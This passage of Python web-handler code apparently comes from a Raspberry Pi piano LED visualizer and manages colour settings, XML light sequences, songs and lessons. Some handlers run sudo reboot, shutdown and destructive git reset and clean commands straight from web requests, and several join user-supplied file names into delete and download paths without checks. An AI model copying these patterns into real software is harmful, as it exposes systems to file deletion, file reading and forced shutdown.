\"multicolor_range_left\":\n        webinterface.ledsettings.multicolor_range[int(second_value)][0] = int(value)\n        webinterface.usersettings.change_setting_value(\"multicolor_range\", webinterface.ledsettings.multicolor_range)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"multicolor_range_right\":\n        webinterface.ledsettings.multicolor_range[int(second_value)][1] = int(value)\n        webinterface.usersettings.change_setting_value(\"multicolor_range\", webinterface.ledsettings.multicolor_range)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"remove_all_multicolors\":\n        webinterface.ledsettings.multicolor.clear()\n        webinterface.ledsettings.multicolor_range.clear()\n\n        webinterface.usersettings.change_setting_value(\"multicolor\", webinterface.ledsettings.multicolor)\n        webinterface.usersettings.change_setting_value(\"multicolor_range\", webinterface.ledsettings.multicolor_range)\n        return jsonify(success=True)\n\n    if setting_name == \"rainbow_offset\":\n        webinterface.ledsettings.rainbow_offset = int(value)\n        webinterface.usersettings.change_setting_value(\"rainbow_offset\",\n                                                       int(webinterface.ledsettings.rainbow_offset))\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"rainbow_scale\":\n        webinterface.ledsettings.rainbow_scale = int(value)\n        webinterface.usersettings.change_setting_value(\"rainbow_scale\",\n                                                       int(webinterface.ledsettings.rainbow_scale))\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"rainbow_timeshift\":\n        webinterface.ledsettings.rainbow_timeshift = int(value)\n        webinterface.usersettings.change_setting_value(\"rainbow_timeshift\",\n                                                       int(webinterface.ledsettings.rainbow_timeshift))\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"speed_slowest_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.speed_slowest[\"red\"] = rgb[0]\n        webinterface.ledsettings.speed_slowest[\"green\"] = rgb[1]\n        webinterface.ledsettings.speed_slowest[\"blue\"] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"speed_slowest_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"speed_slowest_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"speed_slowest_blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"speed_fastest_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.speed_fastest[\"red\"] = rgb[0]\n        webinterface.ledsettings.speed_fastest[\"green\"] = rgb[1]\n        webinterface.ledsettings.speed_fastest[\"blue\"] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"speed_fastest_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"speed_fastest_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"speed_fastest_blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"gradient_start_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.gradient_start[\"red\"] = rgb[0]\n        webinterface.ledsettings.gradient_start[\"green\"] = rgb[1]\n        webinterface.ledsettings.gradient_start[\"blue\"] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"gradient_start_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"gradient_start_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"gradient_start_blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"gradient_end_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.gradient_end[\"red\"] = rgb[0]\n        webinterface.ledsettings.gradient_end[\"green\"] = rgb[1]\n        webinterface.ledsettings.gradient_end[\"blue\"] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"gradient_end_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"gradient_end_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"gradient_end_blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"speed_max_notes\":\n        webinterface.ledsettings.speed_max_notes = int(value)\n        webinterface.usersettings.change_setting_value(\"speed_max_notes\", int(value))\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"speed_period_in_seconds\":\n        webinterface.ledsettings.speed_period_in_seconds = float(value)\n        webinterface.usersettings.change_setting_value(\"speed_period_in_seconds\", float(value))\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"key_in_scale_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.key_in_scale[\"red\"] = rgb[0]\n        webinterface.ledsettings.key_in_scale[\"green\"] = rgb[1]\n        webinterface.ledsettings.key_in_scale[\"blue\"] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"key_in_scale_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"key_in_scale_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"key_in_scale_blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"key_not_in_scale_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.key_not_in_scale[\"red\"] = rgb[0]\n        webinterface.ledsettings.key_not_in_scale[\"green\"] = rgb[1]\n        webinterface.ledsettings.key_not_in_scale[\"blue\"] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"key_not_in_scale_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"key_not_in_scale_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"key_not_in_scale_blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"scale_key\":\n        webinterface.ledsettings.scale_key = int(value)\n        webinterface.usersettings.change_setting_value(\"scale_key\", int(value))\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"next_step\":\n        webinterface.ledsettings.set_sequence(0, 1, False)\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"set_sequence\":\n        if (int(value) == 0):\n            webinterface.ledsettings.__init__(webinterface.usersettings)\n            webinterface.ledsettings.sequence_active = False\n        else:\n            webinterface.ledsettings.set_sequence(int(value) - 1, 0)\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"change_sequence_name\":\n        sequences_tree = minidom.parse(\"sequences.xml\")\n        sequence_to_edit = \"sequence_\" + str(value)\n\n        sequences_tree.getElementsByTagName(sequence_to_edit)[\n            0].getElementsByTagName(\"settings\")[\n            0].getElementsByTagName(\"sequence_name\")[0].firstChild.nodeValue = str(second_value)\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"change_step_value\":\n        sequences_tree = minidom.parse(\"sequences.xml\")\n        sequence_to_edit = \"sequence_\" + str(value)\n\n        sequences_tree.getElementsByTagName(sequence_to_edit)[\n            0].getElementsByTagName(\"settings\")[\n            0].getElementsByTagName(\"next_step\")[0].firstChild.nodeValue = str(second_value)\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"change_step_activation_method\":\n        sequences_tree = minidom.parse(\"sequences.xml\")\n        sequence_to_edit = \"sequence_\" + str(value)\n\n        sequences_tree.getElementsByTagName(sequence_to_edit)[\n            0].getElementsByTagName(\"settings\")[\n            0].getElementsByTagName(\"control_number\")[0].firstChild.nodeValue = str(second_value)\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"add_sequence\":\n        sequences_tree = minidom.parse(\"sequences.xml\")\n\n        sequences_amount = 1\n        while True:\n            if (len(sequences_tree.getElementsByTagName(\"sequence_\" + str(sequences_amount))) == 0):\n                break\n            sequences_amount += 1\n\n        settings = sequences_tree.createElement(\"settings\")\n\n        control_number = sequences_tree.createElement(\"control_number\")\n        control_number.appendChild(sequences_tree.createTextNode(\"0\"))\n        settings.appendChild(control_number)\n\n        next_step = sequences_tree.createElement(\"next_step\")\n        next_step.appendChild(sequences_tree.createTextNode(\"1\"))\n        settings.appendChild(next_step)\n\n        sequence_name = sequences_tree.createElement(\"sequence_name\")\n        sequence_name.appendChild(sequences_tree.createTextNode(\"Sequence \" + str(sequences_amount)))\n        settings.appendChild(sequence_name)\n\n        step = sequences_tree.createElement(\"step_1\")\n\n        color = sequences_tree.createElement(\"color\")\n        color.appendChild(sequences_tree.createTextNode(\"RGB\"))\n        step.appendChild(color)\n\n        red = sequences_tree.createElement(\"Red\")\n        red.appendChild(sequences_tree.createTextNode(\"255\"))\n        step.appendChild(red)\n\n        green = sequences_tree.createElement(\"Green\")\n        green.appendChild(sequences_tree.createTextNode(\"255\"))\n        step.appendChild(green)\n\n        blue = sequences_tree.createElement(\"Blue\")\n        blue.appendChild(sequences_tree.createTextNode(\"255\"))\n        step.appendChild(blue)\n\n        light_mode = sequences_tree.createElement(\"light_mode\")\n        light_mode.appendChild(sequences_tree.createTextNode(\"Normal\"))\n        step.appendChild(light_mode)\n\n        element = sequences_tree.createElement(\"sequence_\" + str(sequences_amount))\n        element.appendChild(settings)\n        element.appendChild(step)\n\n        sequences_tree.getElementsByTagName(\"list\")[0].appendChild(element)\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"remove_sequence\":\n        sequences_tree = minidom.parse(\"sequences.xml\")\n\n        # removing sequence node\n        nodes = sequences_tree.getElementsByTagName(\"sequence_\" + str(value))\n        for node in nodes:\n            parent = node.parentNode\n            parent.removeChild(node)\n\n        # changing nodes tag names\n        i = 1\n        for sequence in sequences_tree.getElementsByTagName(\"list\")[0].childNodes:\n            if (sequence.nodeType == 1):\n                sequences_tree.getElementsByTagName(sequence.nodeName)[0].tagName = \"sequence_\" + str(i)\n                i += 1\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"add_step\":\n        sequences_tree = minidom.parse(\"sequences.xml\")\n\n        step_amount = 1\n        while True:\n            if (len(sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].getElementsByTagName(\n                    \"step_\" + str(step_amount))) == 0):\n                break\n            step_amount += 1\n\n        step = sequences_tree.createElement(\"step_\" + str(step_amount))\n\n        color = sequences_tree.createElement(\"color\")\n\n        color.appendChild(sequences_tree.createTextNode(\"RGB\"))\n        step.appendChild(color)\n\n        red = sequences_tree.createElement(\"Red\")\n        red.appendChild(sequences_tree.createTextNode(\"255\"))\n        step.appendChild(red)\n\n        green = sequences_tree.createElement(\"Green\")\n        green.appendChild(sequences_tree.createTextNode(\"255\"))\n        step.appendChild(green)\n\n        blue = sequences_tree.createElement(\"Blue\")\n        blue.appendChild(sequences_tree.createTextNode(\"255\"))\n        step.appendChild(blue)\n\n        light_mode = sequences_tree.createElement(\"light_mode\")\n        light_mode.appendChild(sequences_tree.createTextNode(\"Normal\"))\n        step.appendChild(light_mode)\n\n        sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].appendChild(step)\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence, reload_steps_list=True)\n\n    # remove node list with a tag name \"step_\" + str(value), and change tag names to maintain order\n    if setting_name == \"remove_step\":\n\n        second_value = int(second_value)\n        second_value += 1\n\n        sequences_tree = minidom.parse(\"sequences.xml\")\n\n        # removing step node\n        nodes = sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].getElementsByTagName(\n            \"step_\" + str(second_value))\n        for node in nodes:\n            parent = node.parentNode\n            parent.removeChild(node)\n\n        # changing nodes tag names\n        i = 1\n        for step in sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].childNodes:\n            if (step.nodeType == 1 and step.tagName != \"settings\"):\n                sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].getElementsByTagName(step.nodeName)[\n                    0].tagName = \"step_\" + str(i)\n                i += 1\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    # saving current led settings as sequence step\n    if setting_name == \"save_led_settings_to_step\" and second_value != \"\":\n\n        # remove node and child under \"sequence_\" + str(value) and \"step_\" + str(second_value)\n        sequences_tree = minidom.parse(\"sequences.xml\")\n\n        second_value = int(second_value)\n        second_value += 1\n\n        nodes = sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].getElementsByTagName(\n            \"step_\" + str(second_value))\n        for node in nodes:\n            parent = node.parentNode\n            parent.removeChild(node)\n\n        # create new step node\n        step = sequences_tree.createElement(\"step_\" + str(second_value))\n\n        # load color mode from webinterface.ledsettings and put it into step node\n        color_mode = sequences_tree.createElement(\"color\")\n        color_mode.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.color_mode)))\n        step.appendChild(color_mode)\n\n        # load mode from webinterface.ledsettings and put it into step node\n        mode = sequences_tree.createElement(\"light_mode\")\n        mode.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.mode)))\n        step.appendChild(mode)\n\n        # if mode is equal \"Fading\" or \"Velocity\" load mode from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.mode == \"Fading\" or webinterface.ledsettings.mode == \"Velocity\"):\n            fadingspeed = sequences_tree.createElement(\"fadingspeed\")\n\n            # depending on fadingspeed name set different fadingspeed value\n            if (webinterface.ledsettings.fadingspeed == \"Slow\"):\n                fadingspeed.appendChild(sequences_tree.createTextNode(\"10\"))\n            elif (webinterface.ledsettings.fadingspeed == \"Medium\"):\n                fadingspeed.appendChild(sequences_tree.createTextNode(\"20\"))\n            elif (webinterface.ledsettings.fadingspeed == \"Fast\"):\n                fadingspeed.appendChild(sequences_tree.createTextNode(\"40\"))\n            elif (webinterface.ledsettings.fadingspeed == \"Very fast\"):\n                fadingspeed.appendChild(sequences_tree.createTextNode(\"50\"))\n            elif (webinterface.ledsettings.fadingspeed == \"Instant\"):\n                fadingspeed.appendChild(sequences_tree.createTextNode(\"1000\"))\n            elif (webinterface.ledsettings.fadingspeed == \"Very slow\"):\n                fadingspeed.appendChild(sequences_tree.createTextNode(\"2\"))\n\n            step.appendChild(fadingspeed)\n\n        # if color_mode is equal to \"Single\" load color from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.color_mode == \"Single\"):\n            red = sequences_tree.createElement(\"Red\")\n            red.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.red)))\n            step.appendChild(red)\n\n            green = sequences_tree.createElement(\"Green\")\n            green.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.green)))\n            step.appendChild(green)\n\n            blue = sequences_tree.createElement(\"Blue\")\n            blue.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.blue)))\n            step.appendChild(blue)\n\n        # if color_mode is equal to \"Multicolor\" load colors from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.color_mode == \"Multicolor\"):\n            # load value from webinterface.ledsettings.multicolor\n            multicolor = webinterface.ledsettings.multicolor\n\n            # loop through multicolor object and add each color to step node under \"sequence_\"+str(value) with tag name \"color_\"+str(i)\n            for i in range(len(multicolor)):\n                color = sequences_tree.createElement(\"color_\" + str(i + 1))\n                new_multicolor = str(multicolor[i])\n                new_multicolor = new_multicolor.replace(\"[\", \"\")\n                new_multicolor = new_multicolor.replace(\"]\", \"\")\n\n                color.appendChild(sequences_tree.createTextNode(new_multicolor))\n                step.appendChild(color)\n\n            # same as above but with multicolor_range and \"color_range_\"+str(i)\n            multicolor_range = webinterface.ledsettings.multicolor_range\n            for i in range(len(multicolor_range)):\n                color_range = sequences_tree.createElement(\"color_range_\" + str(i + 1))\n                new_multicolor_range = str(multicolor_range[i])\n\n                new_multicolor_range = new_multicolor_range.replace(\"[\", \"\")\n                new_multicolor_range = new_multicolor_range.replace(\"]\", \"\")\n                color_range.appendChild(sequences_tree.createTextNode(new_multicolor_range))\n                step.appendChild(color_range)\n\n        # if color_mode is equal to \"Rainbow\" load colors from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.color_mode == \"Rainbow\"):\n            # load values rainbow_offset, rainbow_scale and rainbow_timeshift from webinterface.ledsettings and put them into step node under Offset, Scale and Timeshift\n            rainbow_offset = sequences_tree.createElement(\"Offset\")\n            rainbow_offset.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.rainbow_offset)))\n            step.appendChild(rainbow_offset)\n\n            rainbow_scale = sequences_tree.createElement(\"Scale\")\n            rainbow_scale.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.rainbow_scale)))\n            step.appendChild(rainbow_scale)\n\n            rainbow_timeshift = sequences_tree.createElement(\"Timeshift\")\n            rainbow_timeshift.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.rainbow_timeshift)))\n            step.appendChild(rainbow_timeshift)\n\n        # if color_mode is equal to \"Speed\" load colors from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.color_mode == \"Speed\"):\n            # load values speed_slowest[\"red\"] etc from webinterface.ledsettings and put them under speed_slowest_red etc\n            speed_slowest_red = sequences_tree.createElement(\"speed_slowest_red\")\n            speed_slowest_red.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_slowest[\"red\"])))\n            step.appendChild(speed_slowest_red)\n\n            speed_slowest_green = sequences_tree.createElement(\"speed_slowest_green\")\n            speed_slowest_green.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_slowest[\"green\"])))\n            step.appendChild(speed_slowest_green)\n\n            speed_slowest_blue = sequences_tree.createElement(\"speed_slowest_blue\")\n            speed_slowest_blue.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_slowest[\"blue\"])))\n            step.appendChild(speed_slowest_blue)\n\n            # same as above but with \"fastest\"\n            speed_fastest_red = sequences_tree.createElement(\"speed_fastest_red\")\n            speed_fastest_red.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_fastest[\"red\"])))\n            step.appendChild(speed_fastest_red)\n\n            speed_fastest_green = sequences_tree.createElement(\"speed_fastest_green\")\n            speed_fastest_green.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_fastest[\"green\"])))\n            step.appendChild(speed_fastest_green)\n\n            speed_fastest_blue = sequences_tree.createElement(\"speed_fastest_blue\")\n            speed_fastest_blue.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_fastest[\"blue\"])))\n            step.appendChild(speed_fastest_blue)\n\n            # load \"speed_max_notes\" and \"speed_period_in_seconds\" values from webinterface.ledsettings\n            # and put them under speed_max_notes and speed_period_in_seconds\n\n            speed_max_notes = sequences_tree.createElement(\"speed_max_notes\")\n            speed_max_notes.appendChild(sequences_tree.createTextNode(str(webinterface.ledsettings.speed_max_notes)))\n            step.appendChild(speed_max_notes)\n\n            speed_period_in_seconds = sequences_tree.createElement(\"speed_period_in_seconds\")\n            speed_period_in_seconds.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.speed_period_in_seconds)))\n            step.appendChild(speed_period_in_seconds)\n\n        # if color_mode is equal to \"Gradient\" load colors from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.color_mode == \"Gradient\"):\n            # load values gradient_start_red etc from webinterface.ledsettings and put them under gradient_start_red etc\n            gradient_start_red = sequences_tree.createElement(\"gradient_start_red\")\n            gradient_start_red.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.gradient_start[\"red\"])))\n            step.appendChild(gradient_start_red)\n\n            gradient_start_green = sequences_tree.createElement(\"gradient_start_green\")\n            gradient_start_green.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.gradient_start[\"green\"])))\n            step.appendChild(gradient_start_green)\n\n            gradient_start_blue = sequences_tree.createElement(\"gradient_start_blue\")\n            gradient_start_blue.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.gradient_start[\"blue\"])))\n            step.appendChild(gradient_start_blue)\n\n            # same as above but with gradient_end\n            gradient_end_red = sequences_tree.createElement(\"gradient_end_red\")\n            gradient_end_red.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.gradient_end[\"red\"])))\n            step.appendChild(gradient_end_red)\n\n            gradient_end_green = sequences_tree.createElement(\"gradient_end_green\")\n            gradient_end_green.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.gradient_end[\"green\"])))\n            step.appendChild(gradient_end_green)\n\n            gradient_end_blue = sequences_tree.createElement(\"gradient_end_blue\")\n            gradient_end_blue.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.gradient_end[\"blue\"])))\n            step.appendChild(gradient_end_blue)\n\n        # if color_mode is equal to \"Scale\" load colors from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.color_mode == \"Scale\"):\n            # load values key_in_scale_red etc from webinterface.ledsettings and put them under key_in_scale_red etc\n            key_in_scale_red = sequences_tree.createElement(\"key_in_scale_red\")\n            key_in_scale_red.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.key_in_scale[\"red\"])))\n            step.appendChild(key_in_scale_red)\n\n            key_in_scale_green = sequences_tree.createElement(\"key_in_scale_green\")\n            key_in_scale_green.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.key_in_scale[\"green\"])))\n            step.appendChild(key_in_scale_green)\n\n            key_in_scale_blue = sequences_tree.createElement(\"key_in_scale_blue\")\n            key_in_scale_blue.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.key_in_scale[\"blue\"])))\n            step.appendChild(key_in_scale_blue)\n\n            # same as above but with key_not_in_scale\n            key_not_in_scale_red = sequences_tree.createElement(\"key_not_in_scale_red\")\n            key_not_in_scale_red.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.key_not_in_scale[\"red\"])))\n            step.appendChild(key_not_in_scale_red)\n\n            key_not_in_scale_green = sequences_tree.createElement(\"key_not_in_scale_green\")\n            key_not_in_scale_green.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.key_not_in_scale[\"green\"])))\n            step.appendChild(key_not_in_scale_green)\n\n            key_not_in_scale_blue = sequences_tree.createElement(\"key_not_in_scale_blue\")\n            key_not_in_scale_blue.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.key_not_in_scale[\"blue\"])))\n            step.appendChild(key_not_in_scale_blue)\n\n        try:\n            sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[\n                0].insertBefore(step,\n                                sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[\n                                    0].getElementsByTagName(\"step_\" + str(second_value + 1))[0])\n        except:\n            sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].appendChild(step)\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence, reload_steps_list=True)\n\n    if setting_name == \"screen_on\":\n        if (int(value) == 0):\n            webinterface.menu.disable_screen()\n        else:\n            webinterface.menu.enable_screen()\n\n    if setting_name == \"reset_to_default\":\n        webinterface.usersettings.reset_to_default()\n\n    if setting_name == \"restart_rpi\":\n        call(\"sudo /sbin/reboot now\", shell=True)\n\n    if setting_name == \"turnoff_rpi\":\n        call(\"sudo /sbin/shutdown -h now\", shell=True)\n\n    if setting_name == \"update_rpi\":\n        call(\"sudo git reset --hard HEAD\", shell=True)\n        call(\"sudo git checkout .\", shell=True)\n        call(\"sudo git clean -fdx\", shell=True)\n        call(\"sudo git pull origin master\", shell=True)\n\n    if setting_name == \"connect_ports\":\n        webinterface.midiports.connectall()\n        return jsonify(success=True, reload_ports=True)\n\n    if setting_name == \"disconnect_ports\":\n        call(\"sudo aconnect -x\", shell=True)\n        return jsonify(success=True, reload_ports=True)\n\n    if setting_name == \"restart_rtp\":\n        call(\"sudo systemctl restart rtpmidid\", shell=True)\n\n    if setting_name == \"start_recording\":\n        webinterface.saving.start_recording()\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"cancel_recording\":\n        webinterface.saving.cancel_recording()\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"save_recording\":\n        now = datetime.datetime.now()\n        current_date = now.strftime(\"%Y-%m-%d %H:%M\")\n        webinterface.saving.save(current_date)\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"change_song_name\":\n        if os.path.exists(\"Songs/\" + second_value):\n            return jsonify(success=False, reload_songs=True, error=second_value + \" already exists\")\n\n        if \"_main\" in value:\n            search_name = value.replace(\"_main.mid\", \"\")\n            for fname in os.listdir('Songs'):\n                if search_name in fname:\n                    new_name = second_value.replace(\".mid\", \"\") + fname.replace(search_name, \"\")\n                    os.rename('Songs/' + fname, 'Songs/' + new_name)\n        else:\n            os.rename('Songs/' + value, 'Songs/' + second_value)\n            os.rename('Songs/cache/' + value + \".p\", 'Songs/cache/' + second_value + \".p\")\n\n\n\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"remove_song\":\n        if \"_main\" in value:\n            name_no_suffix = value.replace(\"_main.mid\", \"\")\n            for fname in os.listdir('Songs'):\n                if name_no_suffix in fname:\n                    os.remove(\"Songs/\" + fname)\n        else:\n            os.remove(\"Songs/\" + value)\n\n            file_types = [\".musicxml\", \".xml\", \".mxl\", \".abc\"]\n            for file_type in file_types:\n                try:\n                    os.remove(\"Songs/\" + value.replace(\".mid\", file_type))\n                except:\n                    pass\n\n            try:\n                os.remove(\"Songs/cache/\" + value + \".p\")\n            except:\n                print(\"No cache file for \" + value)\n\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"download_song\":\n        if \"_main\" in value:\n            zipObj = ZipFile(\"Songs/\" + value.replace(\".mid\", \"\") + \".zip\", 'w')\n            name_no_suffix = value.replace(\"_main.mid\", \"\")\n            songs_count = 0\n            for fname in os.listdir('Songs'):\n                if name_no_suffix in fname and \".zip\" not in fname:\n                    songs_count += 1\n                    zipObj.write(\"Songs/\" + fname)\n            zipObj.close()\n            if songs_count == 1:\n                os.remove(\"Songs/\" + value.replace(\".mid\", \"\") + \".zip\")\n                return send_file(\"../Songs/\" + value, mimetype='application/x-csv', attachment_filename=value,\n                                 as_attachment=True)\n            else:\n                return send_file(\"../Songs/\" + value.replace(\".mid\", \"\") + \".zip\", mimetype='application/x-csv',\n                                 attachment_filename=value.replace(\".mid\", \"\") + \".zip\", as_attachment=True)\n        else:\n            return send_file(\"../Songs/\" + value, mimetype='application/x-csv', attachment_filename=value,\n                             as_attachment=True)\n\n    if setting_name == \"download_sheet_music\":\n        file_types = [\".musicxml\", \".xml\", \".mxl\", \".abc\"]\n        i = 0\n        while i < len(file_types):\n            try:\n                new_name = value.replace(\".mid\", file_types[i])\n                return send_file(\"../Songs/\" + new_name, mimetype='application/x-csv', attachment_filename=new_name,\n                                 as_attachment=True)\n            except:\n                i += 1\n        webinterface.learning.convert_midi_to_abc(value)\n        try:\n            return send_file(\"../Songs/\" + value.replace(\".mid\", \".abc\"), mimetype='application/x-csv',\n                             attachment_filename=value.replace(\".mid\", \".abc\"), as_attachment=True)\n        except:\n            print(\"Converting failed\")\n\n\n    if setting_name == \"start_midi_play\":\n        webinterface.saving.t = threading.Thread(target=play_midi, args=(value, webinterface.midiports,\n                                                                         webinterface.saving, webinterface.menu,\n                                                                         webinterface.ledsettings,\n                                                                         webinterface.ledstrip))\n        webinterface.saving.t.start()\n\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"stop_midi_play\":\n        webinterface.saving.is_playing_midi.clear()\n        fastColorWipe(webinterface.ledstrip.strip, True, webinterface.ledsettings)\n\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"learning_load_song\":\n        webinterface.learning.t = threading.Thread(target=webinterface.learning.load_midi, args=(value,))\n        webinterface.learning.t.start()\n\n        return jsonify(success=True, reload_learning_settings=True)\n\n    if setting_name == \"start_learning_song\":\n        webinterface.learning.t = threading.Thread(target=webinterface.learning.learn_midi)\n        webinterface.learning.t.start()\n\n        return jsonify(success=True)\n\n    if setting_name == \"stop_learning_song\":\n        webinterface.learning.is_started_midi = False\n        fastColorWipe(webinterface.ledstrip.strip, True, webinterface.ledsettings)\n\n        return jsonify(success=True)\n\n    if setting_name == \"change_practice\":\n        value = int(value)\n        webinterface.learning.practice = value\n        webinterface.learning.practice = clamp(webinterface.learning.practice, 0, len(webinterface.learning.practiceList) - 1)\n        webinterface.usersettings.change_setting_value(\"practice\", webinterface.learning.practice)\n\n        return jsonify(success=True)\n\n    if setting_name == \"change_tempo\":\n        value = int(value)\n        webinterface.learning.set_tempo = value\n        webinterface.learning.set_tempo = clamp(webinterface.learning.set_tempo, 10, 200)\n        webinterface.usersettings.change_setting_value(\"set_tempo\", webinterface.learning.set_tempo)\n\n        return jsonify(success=True)\n\n    if setting_name == \"change_hands\":\n        value = int(value)\n        webinterface.learning.hands = value\n        webinterface.learning.hands = clamp(webinterface.learning.hands, 0, len(webinterface.learning.handsList) - 1)\n        webinterface.usersettings.change_setting_value(\"hands\", webinterface.learning.hands)\n\n        return jsonify(success=True)\n\n    if setting_name == \"change_mute_hand\":\n        value = int(value)\n        webinterface.learning.mute_hand = value\n        webinterface.learning.mute_hand = clamp(webinterface.learning.mute_hand, 0, len(webinterface.learning.mute_handList) - 1)\n        webinterface.usersettings.change_setting_value(\"mute_hand\", webinterface.learning.mute_hand)\n\n        return jsonify(success=True)\n\n    if setting_name == \"learning_start_point\":\n        value = int(value)\n        webinterface.learning.start_point = value\n        webinterface.learning.start_point = clamp(webinterface.learning.start_point, 0, webinterface.learning.end_point - 1)\n        